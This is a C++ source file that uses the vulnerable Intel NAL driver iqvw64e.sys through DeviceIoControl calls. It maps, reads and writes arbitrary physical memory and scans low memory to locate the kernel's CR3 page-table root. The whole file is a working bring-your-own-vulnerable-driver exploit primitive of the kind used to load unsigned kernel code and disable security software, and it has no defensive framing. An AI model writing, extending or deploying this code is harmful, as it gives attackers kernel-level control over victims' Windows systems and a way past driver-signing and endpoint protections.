// ioctl.cpp -- iqvw64e.sys (Intel NAL) physmem implementation.

#include "ioctl.h"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <vector>

namespace ioctl {

static bool nal_call(HANDLE device, void* buf, DWORD buf_size) {
    DWORD returned = 0;
    return DeviceIoControl(device, IOCTL_NAL,
                           buf, buf_size, buf, buf_size,
                           &returned, nullptr) != FALSE;
}

static bool map_io_space(HANDLE device, uint64_t phys, uint64_t size, uint64_t& kernel_va) {
    MapIoSpace req{};
    req.case_number = 0x19;
    req.phys_addr = phys;
    req.size = size;
    if (!nal_call(device, &req, sizeof(req))) {
        std::printf("[!] ioctl::map_io_space failed (phys=%016llX size=%llu err=%lu)\n",
                    static_cast<unsigned long long>(phys),
                    static_cast<unsigned long long>(size), GetLastError());
        return false;
    }
    kernel_va = req.return_virt_addr;
    return kernel_va != 0;
}

static bool unmap_io_space(HANDLE device, uint64_t kernel_va, uint64_t size) {
    UnmapIoSpace req{};
    req.case_number = 0x1A;
    req.virt_addr = kernel_va;
    req.size = size;
    return nal_call(device, &req, sizeof(req));
}

static bool nal_copy(HANDLE device, uint64_t src, uint64_t dst, uint64_t len) {
    NalCopyMem req{};
    req.case_number = 0x21;
    req.source = src;
    req.destination = dst;
    req.length = len;
    return nal_call(device, &req, sizeof(req));
}

bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
    uint8_t* out = static_cast<uint8_t*>(dst);
    while (size) {
        uint64_t page_off = phys & 0xFFFULL;
        size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));

        uint64_t kva = 0;
        if (!map_io_space(device, phys & ~0xFFFULL, 0x1000, kva))
            return false;

        bool ok = nal_copy(device, kva + page_off,
                           reinterpret_cast<uint64_t>(out), chunk);
        unmap_io_space(device, kva, 0x1000);
        if (!ok) return false;

        phys += chunk;
        out  += chunk;
        size -= chunk;
    }
    return true;
}

bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        uint64_t page_off = phys & 0xFFFULL;
        size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));

        uint64_t kva = 0;
        if (!map_io_space(device, phys & ~0xFFFULL, 0x1000, kva))
            return false;

        bool ok = nal_copy(device, reinterpret_cast<uint64_t>(in),
                           kva + page_off, chunk);
        unmap_io_space(device, kva, 0x1000);
        if (!ok) return false;

        phys += chunk;
        in   += chunk;
        size -= chunk;
    }
    return true;
}

bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
    uint64_t kva = 0;
    if (!map_io_space(device, 0, 0x100000, kva))
        return false;

    std::vector<uint8_t> mem(0x100000);
    bool copied = nal_copy(device, kva,
                           reinterpret_cast<uint64_t>(mem.data()), 0x100000);
    unmap_io_space(device, kva, 0x100000);

    if (!copied) {
        std::printf("[!] ioctl::get_pml4_phys: copy of low 1MB failed\n");
        return false;
    }

    cr3 = 0;
    for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000) {
        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem.data() + off);
        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 112);
        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 160);

        if ((sig0   & 0xFFFFFFFFFFFF00FFULL) == 0x00000001000600E9ULL &&
            (ptr112 & 0xFFFFF80000000003ULL) == 0xFFFFF80000000000ULL &&
            (val160 & 0xFFFFFF0000000FFFULL) == 0) {
            cr3 = val160;
            break;
        }
    }

    if (cr3 == 0) {
        std::printf("[!] ioctl::get_pml4_phys: CR3 scan found no matching page in low 1 MB\n");
        return false;
    }
    return true;
}

} // namespace ioctl
